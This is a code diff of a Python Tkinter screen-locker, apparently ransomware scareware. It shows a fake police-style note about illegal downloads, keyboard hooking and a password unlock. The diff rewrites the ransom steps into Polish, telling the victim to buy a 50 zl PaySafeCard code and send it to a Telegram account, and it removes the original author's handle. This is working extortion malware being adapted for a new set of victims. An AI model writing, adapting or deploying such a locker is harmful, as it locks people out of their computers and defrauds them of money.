@@ -11,9 +11,8 @@ suspicion of illigal content download and
 distribution.
 Nothing to worry, the files are not encrypted
 you are blocked from accessing your\ncomputer''' # Text
-steps = '''1. Take your cash to one of the store.
-2. Get a Moneypak and puchange it with case at the register
-3. come back and enter your moneypak code.\n\nTelegram: @esfelurm''' # Text
+steps = '''1. Idz do sklepu i zakup kod PaySafeCard o wartosci 50 zl 
+2. Wyslij kod na telegramie : @mojamamisz''' # Text
 
 
 
@@ -47,6 +46,11 @@ def uninstall(wind):
 	os.remove(bat_path + '\\' + "open.bat")
 	keyboard.unhook_all()
 
+def main(self):
+    while self.running:
+        # TU
+        time.sleep(10)
+
 wind = Tk()
 count = 3
 
@@ -65,7 +69,7 @@ def tapp(key):
 def check():
 	global count
 	if enter_pass.get() == password:
-		messagebox.showinfo("Locker","UNLOCKED SUCCESSFULLY\nTg: @esfelurm")
+		messagebox.showinfo("Locker","UNLOCKED SUCCESSFULLY")
 
 		uninstall(wind)
 	else:
@@ -133,3 +137,4 @@ delbutton = Button(wind,text="Delete", bg='#FF0000', fg='#ffffff', bd=5, height=
 button = Button(wind,text="Unlock", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=check).place(x=940 + left_value, y=720)
 
 wind.mainloop()
+
